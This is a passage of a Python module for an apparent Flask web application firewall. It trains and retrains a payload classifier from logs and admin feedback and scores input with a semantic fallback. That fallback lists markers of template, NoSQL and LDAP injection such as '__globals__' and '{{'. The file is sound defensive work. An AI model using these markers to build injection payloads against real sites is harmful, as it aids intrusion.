            class_weight="balanced",
            random_state=42,
            n_jobs=-1,
            verbosity=-1,
        )
    return RandomForestClassifier(
        n_estimators=100,
        max_depth=15,
        min_samples_leaf=4,
        class_weight="balanced",
        random_state=42,
        n_jobs=-1,
    )


# ─── Paths ───────────────────────────────────────────────────────

MODEL_PATH = get_storage_path("classifier_model_file", os.path.join("flaskguard", "models", "classifier.pkl"))
META_PATH = get_storage_path("classifier_meta_file", os.path.join("flaskguard", "models", "model_meta.json"))
FEEDBACK_FILE = get_storage_path("feedback_file", os.path.join("flaskguard", "logs", "feedback.json"))
ATTACKS_FILE = get_storage_path("attacks_file", os.path.join("flaskguard", "logs", "attacks.json"))
MODEL_DIR = os.path.dirname(MODEL_PATH)
LOG_DIR = os.path.dirname(ATTACKS_FILE)

os.makedirs(MODEL_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)

# ─── Globals ─────────────────────────────────────────────────────

_lock = threading.Lock()
_model = None
_model_meta = {
    "trained_at": None,
    "samples": 0,
    "accuracy": None,
    "last_retrained": None,
}


# ─── Feedback System ─────────────────────────────────────────────


def _load_feedback() -> list:
    if not os.path.exists(FEEDBACK_FILE):
        return []
    with open(FEEDBACK_FILE, "r", encoding="utf-8") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return []


def _save_feedback(entries: list):
    os.makedirs(os.path.dirname(FEEDBACK_FILE), exist_ok=True)
    with open(FEEDBACK_FILE, "w", encoding="utf-8") as f:
        json.dump(entries, f, indent=2)


def add_feedback(payload: str, is_attack: bool) -> dict:
    """
    Record admin feedback for a payload.
    is_attack=True  -> confirm it IS malicious (label=1)
    is_attack=False -> false positive, it is NORMAL (label=0)
    """
    entries = _load_feedback()
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "payload": payload[:500],
        "label": 1 if is_attack else 0,
    }
    entries.append(entry)
    # cap at 1000 feedback entries
    entries = entries[-1000:]
    _save_feedback(entries)
    return {"status": "ok", "feedback_count": len(entries)}


def get_feedback() -> list:
    return _load_feedback()


# ─── Log Ingestion ───────────────────────────────────────────────


def _load_attack_payloads(limit: int = 500, dedupe: bool = True) -> list:
    """Read payloads from attacks.json and return as list of strings."""
    if not os.path.exists(ATTACKS_FILE):
        return []
    with open(ATTACKS_FILE, "r", encoding="utf-8") as f:
        try:
            events = json.load(f)
        except json.JSONDecodeError:
            return []

    payloads = []
    for ev in events[-limit:]:
        p = ev.get("payload", "")
        if p:
            payloads.append(p)

    if dedupe:
        seen = set()
        unique = []
        for p in payloads:
            normalized = p.lower().strip()
            if normalized not in seen:
                seen.add(normalized)
                unique.append(p)
        payloads = unique

    return payloads


# ─── Model Training ──────────────────────────────────────────────


def _build_dataset() -> tuple:
    """
    Combine baseline + real attacks from logs + admin feedback.
    Returns (texts, labels).
    """
    texts, labels = [], []

    # 1. Baseline
    for t, l in BASELINE_DATA:
        texts.append(t)
        labels.append(l)

    # 2. Real blocked attacks (label=1)
    attack_payloads = _load_attack_payloads(limit=500, dedupe=True)
    for p in attack_payloads:
        texts.append(p)
        labels.append(1)

    # 3. Admin feedback
    feedback = _load_feedback()
    for item in feedback:
        texts.append(item["payload"])
        labels.append(item["label"])

    return texts, labels


def train_model(save: bool = True) -> Pipeline:
    """Train from baseline data only (initial setup)."""
    texts, labels = zip(*BASELINE_DATA)
    pipeline = Pipeline(
        [
            (
                "tfidf",
                TfidfVectorizer(
                    analyzer="char_wb", ngram_range=(2, 4), max_features=400
                ),
            ),
            ("clf", _make_classifier()),
        ]
    )
    pipeline.fit(texts, labels)

    if save:
        os.makedirs(os.path.dirname(MODEL_PATH), exist_ok=True)
        with open(MODEL_PATH, "wb") as f:
            pickle.dump(pipeline, f)
        _save_meta(
            {
                "trained_at": datetime.utcnow().isoformat(),
                "samples": len(texts),
                "accuracy": None,
                "last_retrained": None,
            }
        )
    return pipeline


def retrain_from_logs() -> dict:
    """
    Full retraining pipeline using baseline + logs + feedback.
    Computes validation metrics and persists the new model.
    """
    texts, labels = _build_dataset()

    if len(texts) < 20:
        return {
            "status": "error",
            "message": f"Not enough data ({len(texts)} samples). Need >= 20.",
        }

    # Split for quick validation metrics
    try:
        X_train, X_test, y_train, y_test = train_test_split(
            texts, labels, test_size=0.2, random_state=42, stratify=labels
        )
    except ValueError:
        # fallback if stratify fails (e.g., only one class in logs)
        X_train, X_test, y_train, y_test = train_test_split(
            texts, labels, test_size=0.2, random_state=42
        )

    pipeline = Pipeline(
        [
            (
                "tfidf",
                TfidfVectorizer(
                    analyzer="char_wb", ngram_range=(2, 4), max_features=400
                ),
            ),
            ("clf", _make_classifier()),
        ]
    )
    pipeline.fit(X_train, y_train)

    # Metrics — hold-out test set
    preds = pipeline.predict(X_test)
    acc = round(accuracy_score(y_test, preds) * 100, 2)
    try:
        prec = round(precision_score(y_test, preds, zero_division=0.0) * 100, 2)
        rec = round(recall_score(y_test, preds, zero_division=0.0) * 100, 2)
        f1 = round(f1_score(y_test, preds, zero_division=0.0) * 100, 2)
    except Exception:
        prec = rec = f1 = None

    # Cross-validation (5-fold)
    cv_scores = None
    try:
        cv_scores = cross_val_score(pipeline, texts, labels, cv=5, scoring="f1")
        cv_mean = round(cv_scores.mean() * 100, 2)
        cv_std = round(cv_scores.std() * 100, 2)
    except Exception:
        cv_mean = cv_std = None

    # Persist
    with _lock:
        os.makedirs(os.path.dirname(MODEL_PATH), exist_ok=True)
        with open(MODEL_PATH, "wb") as f:
            pickle.dump(pipeline, f)
        global _model
        _model = pipeline

    meta = {
        "trained_at": datetime.utcnow().isoformat(),
        "samples": len(texts),
        "accuracy": acc,
        "precision": prec,
        "recall": rec,
        "f1": f1,
        "cv_f1_mean": cv_mean,
        "cv_f1_std": cv_std,
        "model_type": type(pipeline.named_steps["clf"]).__name__,
        "last_retrained": datetime.utcnow().isoformat(),
        "attack_samples": len([l for l in labels if l == 1]),
        "normal_samples": len([l for l in labels if l == 0]),
    }
    _save_meta(meta)
    return {"status": "ok", **meta}


# ─── Model Persistence Helpers ───────────────────────────────────


def _save_meta(meta: dict):
    os.makedirs(os.path.dirname(META_PATH), exist_ok=True)
    with open(META_PATH, "w", encoding="utf-8") as f:
        json.dump(meta, f, indent=2)


def _load_meta() -> dict:
    if os.path.exists(META_PATH):
        with open(META_PATH, "r", encoding="utf-8") as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                pass
    return _model_meta.copy()


def load_model() -> Pipeline:
    if os.path.exists(MODEL_PATH):
        with open(MODEL_PATH, "rb") as f:
            model = pickle.load(f)
        clf = getattr(model, "named_steps", {}).get("clf")
        compatible_types = (RandomForestClassifier,)
        if _HAS_LIGHTGBM:
            compatible_types = compatible_types + (LGBMClassifier,)
        if not isinstance(clf, compatible_types):
            return train_model()
        # Ensure meta exists for legacy models
        if not os.path.exists(META_PATH):
            _save_meta(
                {
                    "trained_at": datetime.utcnow().isoformat(),
                    "samples": len(BASELINE_DATA),
                    "accuracy": None,
                    "last_retrained": None,
                }
            )
        return model
    return train_model()


# ─── Public Model Interface ──────────────────────────────────────


def get_model() -> Pipeline:
    global _model
    with _lock:
        if _model is None:
            _model = load_model()
        return _model


def ml_detect(input_data: str) -> bool:
    if not input_data or len(input_data) < 3:
        return False
    try:
        return ml_confidence(input_data) >= 85.0
    except Exception:
        return False


def _semantic_attack_confidence(input_data: str) -> float:
    """
    Lightweight semantic fallback for attack families that are often written as
    path/search text and may not contain the symbols needed by regex rules.
    """
    text = " ".join(str(input_data).lower().replace(".", " ").replace("_", " ").split())
    compact = text.replace(" ", "")

    phrase_groups = [
        ("mongodb", "where", "function", "return", "true"),
        ("mongo", "operator", "password", "bypass"),
        ("password", "regex", "wildcard", "login", "bypass"),
        ("ldap", "uid", "wildcard", "objectclass"),
        ("constructor", "constructor", "alert"),
        ("template", "constructor", "prototype", "execution"),
        ("server", "side", "template", "globals"),
        ("config", "items"),
    ]

    if "{{" in input_data and "}}" in input_data:
        return 96.0
    if "${" in input_data and "}" in input_data:
        return 94.0
    if "__globals__" in input_data or "__subclasses__" in input_data:
        return 98.0
    if "constructorconstructor" in compact or "constructoralert" in compact:
        return 94.0

    for group in phrase_groups:
        if all(term in text for term in group):
            return 94.0

    return 0.0


def ml_confidence(input_data: str) -> float:
    try:
        model = get_model()
        proba = model.predict_proba([input_data])[0]
        model_confidence = round(float(proba[1]) * 100, 1)
        semantic_confidence = _semantic_attack_confidence(input_data)
        return max(model_confidence, semantic_confidence)
    except Exception:
        return _semantic_attack_confidence(input_data)


def get_model_status() -> dict:
    """Return current model metadata for dashboard display."""
    meta = _load_meta()
    feedback_count = len(_load_feedback())
    attack_count = len(_load_attack_payloads(limit=5000, dedupe=False))
    model = get_model()
    model_type = type(model.named_steps["clf"]).__name__
    return {
        **meta,
        "model_path": MODEL_PATH,
        "model_exists": os.path.exists(MODEL_PATH),
        "model_type": model_type,
        "feedback_entries": feedback_count,
        "logged_attack_payloads": attack_count,
    }


def get_feature_importance(top_n: int = 20) -> list:
    """
    Return the top-N most important character n-gram features for attack detection.
    Uses gain-based importance for LightGBM, split-based for Random Forest.
    """
    model = get_model()
    clf = model.named_steps["clf"]

    vectorizer = model.named_steps["tfidf"]
    feature_names = vectorizer.get_feature_names_out()

    # LightGBM: prefer gain-based importance (more informative)
    if _HAS_LIGHTGBM and hasattr(clf, "booster_"):
        try:
            importances = clf.booster_.feature_importance(importance_type="gain")
        except Exception:
            importances = clf.feature_importances_
    elif hasattr(clf, "feature_importances_"):
        importances = clf.feature_importances_
    else:
        return []

    # Sort and return top N
    indices = importances.argsort()[::-1][:top_n]
    return [
        {
            "rank": i + 1,
            "feature": feature_names[idx],
            "importance": round(float(importances[idx]), 6),
        }
        for i, idx in enumerate(indices)
    ]


# Model training is lazy during imports. Use train_model() during builds or startup
# when eager model creation is desired.
